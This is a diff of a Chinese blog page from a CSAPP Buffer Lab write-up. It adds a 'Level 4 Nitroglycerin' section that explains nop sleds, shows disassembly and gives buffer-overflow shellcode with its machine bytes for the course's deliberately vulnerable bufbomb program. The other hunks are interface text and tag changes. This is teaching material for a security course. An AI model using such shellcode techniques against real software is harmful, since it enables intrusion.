@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-05.png">
 <meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-06.png">
 <meta property="og:image" content="http://yoursite.com/images/CSAPP-BufferLab-07.png">
-<meta property="og:updated_time" content="2018-05-12T05:51:43.834Z">
+<meta property="og:updated_time" content="2018-05-12T17:32:30.959Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="深入理解计算机系统|CSAPP-Bufferlab">
 <meta name="twitter:description" content="简介Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。 预备知识 IA32的栈帧结构，可参考：深入理解计算机系统|汇编的世界-5 gdb调试，可参考：工具|gdb调试  实验准备实验讲义中主要包含了以下3个可执行文件：  bufbomb 你所要攻击的缓冲区炸弹程序 makecoo">
@@ -58,7 +58,7 @@
 				<h1 class="site-name"><a href="/" title="只为不凡而来">只为不凡而来</a></h1>
 				<h2 class="blog-motto">小智的世界</h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -101,16 +101,16 @@
 		<a href="/about" title="wuduozhi" target="_blank" itemprop="author">wuduozhi</a>
 		
   <p class="article-time">
-    <time datetime="2018-05-11T20:29:36.000Z" itemprop="datePublished"> 發表於 2018-05-12</time>
+    <time datetime="2018-05-11T20:29:36.000Z" itemprop="datePublished"> 发表于 2018-05-12</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		<div id="toc" class="toc-article">
-			<strong class="toc-title">文章目錄</strong>
+			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预备知识"><span class="toc-number">2.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验准备"><span class="toc-number">3.</span> <span class="toc-text">实验准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始攻关"><span class="toc-number">4.</span> <span class="toc-text">开始攻关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-0-Candle"><span class="toc-number">4.1.</span> <span class="toc-text">Level 0 Candle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1-Sparkler"><span class="toc-number">4.2.</span> <span class="toc-text">Level 1 Sparkler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2-Firecracker"><span class="toc-number">4.3.</span> <span class="toc-text">Level 2 Firecracker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3-Dynamite"><span class="toc-number">4.4.</span> <span class="toc-text">Level 3 Dynamite</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预备知识"><span class="toc-number">2.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验准备"><span class="toc-number">3.</span> <span class="toc-text">实验准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始攻关"><span class="toc-number">4.</span> <span class="toc-text">开始攻关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-0-Candle"><span class="toc-number">4.1.</span> <span class="toc-text">Level 0 Candle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1-Sparkler"><span class="toc-number">4.2.</span> <span class="toc-text">Level 1 Sparkler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2-Firecracker"><span class="toc-number">4.3.</span> <span class="toc-text">Level 2 Firecracker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3-Dynamite"><span class="toc-number">4.4.</span> <span class="toc-text">Level 3 Dynamite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-4-Nitroglycerin"><span class="toc-number">4.5.</span> <span class="toc-text">Level 4 Nitroglycerin</span></a></li></ol></li></ol>
 		
 		</div>
 		
@@ -212,6 +212,21 @@ int getbuf()
 <p>当执行完<code>push 0x8048c93</code>时的内存空间：</p>
 <p><img src="/images/CSAPP-BufferLab-07.png" alt="level-3"></p>
 <p>执行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level3.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Boom!: getbuf returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+<h4 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4 Nitroglycerin"></a>Level 4 Nitroglycerin</h4><p>For this level, we have gone the opposite direction, making the stack positions even less stable than they normally are. Hence the name “nitroglycerin”—an explosive that is notoriously unstable.</p>
+<p>When you run BUFBOMB with the command line flag “-n,” it will run in “Nitro” mode. Rather than calling<br>the function getbuf, the program calls a slightly different function getbufn:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int getbufn()</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">   char buf[512];</div><div class="line"></div><div class="line">   Gets(buf);</div><div class="line"></div><div class="line">   return 1;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个函数与getbuf所不同的是，分配了512字节的字符数组，而调用getbufn的函数会在栈中随机分配一段存储区，这导致getbufn使用的栈基址EBP随机变化。此外，在Nitro模式运行时，bufbomb会要求提供5次输入字符串，每一次都要求getbufn的返回值为实验者的cookie。</p>
+<p>Level4的其他要求与Level3相同，但它要求提供同一个恶意代码，在getbufn被调用5次后，最终仍返回到testn函数中，且不能破坏testn的堆栈状态，并使返回值为cookie。</p>
+<p>总结一下，编写恶意代码需要满足（1）恢复testn的栈帧；（2）设置 getbufn 返回值为cookie；（3）跳转到testn中调用getbufn后的下一指令地址。</p>
+<p>首先，先说一下如何解决对于栈上地址不固定，二通过溢出输入字符串写入栈的跳转地址需要固定的问题。依据英文PDF，我们可以痛<code>nop sleds</code>的技术，大概就是：在不清楚有效机器代码的入口地址时，可以在有效机器代码前以大量的NOP机器指令填充，只要跳转地址处于这些nop 上就能到达有效机器代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">空操作指令指令格式：NOP</div><div class="line"></div><div class="line">   说明：NOP是英语“No Operation”的缩写。NOP无操作数，所以称为“空操作”。</div><div class="line"></div><div class="line">   执行NOP指令只使程序计数器PC加1，所以占用一个机器周期。</div></pre></td></tr></table></figure></p>
+<p>同时，由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：<strong>跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。</strong></p>
+<p>有了上面的基础，我们首先来看看getbufn的汇编代码与getbuf有什么区别！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">08048be6 &lt;getbufn&gt;:</div><div class="line"> 8048be6:	55                   	push   %ebp</div><div class="line"> 8048be7:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048be9:	81 ec 18 02 00 00    	sub    $0x218,%esp</div><div class="line"> 8048bef:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax</div><div class="line"> 8048bf5:	89 04 24             	mov    %eax,(%esp)</div><div class="line"> 8048bf8:	e8 4d ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048bfd:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c02:	c9                   	leave  </div><div class="line"> 8048c03:	c3                   	ret    </div><div class="line"></div><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure>
+<p>发现在调用getbuf时，ebp的内容比esp内容大0x28，而在getbufn中大0x218。</p>
+<p>通过查看testn的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">08048c1c &lt;testn&gt;:</div><div class="line"> 8048c1c:	55                   	push   %ebp</div><div class="line"> 8048c1d:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c1f:	83 ec 28             	sub    $0x28,%esp</div><div class="line"> 8048c22:	c7 45 f4 ef be ad de 	movl   $0xdeadbeef,-0xc(%ebp)</div><div class="line"> 8048c29:	e8 b8 ff ff ff       	call   8048be6 &lt;getbufn&gt;</div><div class="line"> 8048c2e:	8b 55 f4             	mov    -0xc(%ebp),%edx</div><div class="line"> 8048c31:	81 fa ef be ad de    	cmp    $0xdeadbeef,%edx</div><div class="line"> 8048c37:	74 0e                	je     8048c47 &lt;testn+0x2b&gt;</div><div class="line"> 8048c39:	c7 04 24 a8 a0 04 08 	movl   $0x804a0a8,(%esp)</div><div class="line"> 8048c40:	e8 fb fc ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 8048c45:	eb 36                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c47:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8048c4d:	75 1e                	jne    8048c6d &lt;testn+0x51&gt;</div><div class="line"> 8048c4f:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c53:	c7 04 24 d4 a0 04 08 	movl   $0x804a0d4,(%esp)</div><div class="line"> 8048c5a:	e8 81 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c5f:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)</div><div class="line"> 8048c66:	e8 79 04 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8048c6b:	eb 10                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c6d:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c71:	c7 04 24 f7 9e 04 08 	movl   $0x8049ef7,(%esp)</div><div class="line"> 8048c78:	e8 63 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c7d:	c9                   	leave  </div><div class="line"> 8048c7e:	c3                   	ret</div></pre></td></tr></table></figure></p>
+<p>可以知道在调用getbufn前，<code>$ebp = $esp+0x28</code>，同时也能得到正确返回地址为<code>0x8048c2e</code>,所以可构造攻击代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">leal 0x28(%esp), %ebp  /* recovery %ebp */</div><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">push $0x8048c2e       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>指令序列为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">8d 6c 24 28</div><div class="line">a1 e4 c1 04 08</div><div class="line">68 2e 8c 04 08</div><div class="line">c3</div></pre></td></tr></table></figure></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -239,6 +254,13 @@ int getbuf()
 	
 <nav class="article-nav clearfix">
  
+ <div class="prev" >
+ <a href="/2018/05/13/计算机算法-动态规划之0-1背包问题/" title="计算机算法|动态规划之0-1背包问题">
+  <span>
+  计算机算法|动态规划之0-1背包问题</span>
+</a>
+</div>
+
 
 <div class="next">
 <a href="/2018/05/11/Linux-Linux命令小抄/"  title="Linux|Linux命令小抄">
@@ -252,10 +274,10 @@ int getbuf()
 	
 
 </div>  
-      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
 <aside class="clearfix">
 <div id="authorInfo">
 	
@@ -283,7 +305,7 @@ int getbuf()
 
   
 <div class="categorieslist">
-	<p class="asidetitle">分類</p>
+	<p class="asidetitle">分类</p>
 		<ul>
 		
 		  
@@ -343,13 +365,11 @@ int getbuf()
 		  
 		
 		  
-		
-		  
 			<li><a href="/categories/爬虫/" title="爬虫">爬虫<sup>3</sup></a></li>
 		  
 		
 		  
-			<li><a href="/categories/计算机算法/" title="计算机算法">计算机算法<sup>6</sup></a></li>
+			<li><a href="/categories/计算机算法/" title="计算机算法">计算机算法<sup>7</sup></a></li>
 		  
 		
 		  
@@ -374,7 +394,7 @@ int getbuf()
 
   
 <div class="tagslist">
-	<p class="asidetitle">標簽</p>
+	<p class="asidetitle">标签</p>
 		<ul class="clearfix">
 		
 			
@@ -386,11 +406,11 @@ int getbuf()
 			
 		
 			
-				<li><a href="/tags/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>12</sup></a></li>
+				<li><a href="/tags/college/" title="college">college<sup>12</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/college/" title="college">college<sup>12</sup></a></li>
+				<li><a href="/tags/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>12</sup></a></li>
 			
 		
 			
@@ -398,11 +418,11 @@ int getbuf()
 			
 		
 			
-				<li><a href="/tags/数据结构/" title="数据结构">数据结构<sup>7</sup></a></li>
+				<li><a href="/tags/计算机算法/" title="计算机算法">计算机算法<sup>7</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/计算机算法/" title="计算机算法">计算机算法<sup>6</sup></a></li>
+				<li><a href="/tags/数据结构/" title="数据结构">数据结构<sup>7</sup></a></li>
 			
 		
 			
@@ -410,11 +430,7 @@ int getbuf()
 			
 		
 			
-				<li><a href="/tags/python/" title="python">python<sup>3</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/机器学习/" title="机器学习">机器学习<sup>3</sup></a></li>
+				<li><a href="/tags/爬虫/" title="爬虫">爬虫<sup>3</sup></a></li>
 			
 		
 			
@@ -422,11 +438,15 @@ int getbuf()
 			
 		
 			
-				<li><a href="/tags/爬虫/" title="爬虫">爬虫<sup>3</sup></a></li>
+				<li><a href="/tags/python/" title="python">python<sup>3</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/面试/" title="面试">面试<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/机器学习/" title="机器学习">机器学习<sup>3</sup></a></li>
 			
 		
 			
@@ -442,19 +462,19 @@ int getbuf()
 			
 		
 			
+				<li><a href="/tags/git/" title="git">git<sup>1</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/Linux/" title="Linux">Linux<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/数据库/" title="数据库">数据库<sup>1</sup></a></li>
+				<li><a href="/tags/Jersey/" title="Jersey">Jersey<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/Octave/" title="Octave">Octave<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/多线程/" title="多线程">多线程<sup>1</sup></a></li>
+				<li><a href="/tags/大学/" title="大学">大学<sup>1</sup></a></li>
 			
 		
 		</ul>
@@ -462,7 +482,7 @@ int getbuf()
 
 
   <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS 訂閱</a>
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
 </div>
 
 </aside>
@@ -655,7 +675,7 @@ $(document).ready(function(){
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="返回頂部"><img src="/img/scrollup.png"/></a>
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
